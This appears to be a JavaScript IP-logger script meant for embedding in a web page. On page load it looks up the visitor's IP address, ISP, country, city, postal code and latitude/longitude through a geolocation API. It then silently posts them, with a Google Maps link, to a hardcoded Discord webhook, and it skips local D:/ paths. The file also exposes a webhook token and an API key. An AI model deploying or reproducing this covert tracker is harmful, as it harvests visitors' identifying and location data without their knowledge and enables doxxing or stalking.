var webHookUrl = "https://discord.com/api/webhooks/1262518500010889307/rhOGWxz2SdAF3j0-qq_JOd0teoqs8UDfl4gRfpNWvJ9bFl99qa0GV8iC4HpnFDX77Tsm";

let request = async () => {
    let response = await fetch('https://api.ipdata.co/?api-key=2c3eec05908b1cb9de28f604b59185a418853af65c734900b902ed98');
    let data = await response.json();

    var ip = data.ip;

    var provider = data.asn.name + " (" + data.asn.asn + ")";

    var timezone = data.time_zone.name + ", " + data.time_zone.offset;
    var country = data.country_name;
    var countryCode = data.country_code.toLowerCase()
    var region = data.region + " (" + data.region_code + ")";
    var city = data.city;

    var zip = data.postal;
    var lat = data.latitude;
    var lon = data.longitude;

    let maps_link = "[Maps Link](https://www.google.co.uk/maps/place/" + lat + "," + lon + ")"

    var postRequest = new XMLHttpRequest();
    postRequest.open("POST", webHookUrl);

    postRequest.setRequestHeader('Content-type', 'application/json');

    var params = {
        username: "IP Log",
        avatar_url: "",
        content: "__**:globe_with_meridians: IP-Adress:**__ \n"
            + "`" + ip + "`" +
            "\n \n__**:telephone: Provider:**__ \n"
            + provider +
            "\n \n__**:map: Timezone:**__ \n"
            + timezone +
            "\n \n__**:flag_" + countryCode + ": Country and Region:**__ \n"
            + country + " - " + region +
            "\n \n__**:cityscape: City and Zip:**__ \n"
            + " " + city + ", " + zip +
            "\n \n__**:round_pushpin: Location:**__ \n"
            + "**Longitude:** " + lon + "\n"
            + "**Latitude:** " + lat + "\n"
            + maps_link
    }

    postRequest.send(JSON.stringify(params));

}

if (!document.location.toString().toLowerCase().includes("d:/")) {
    request();
}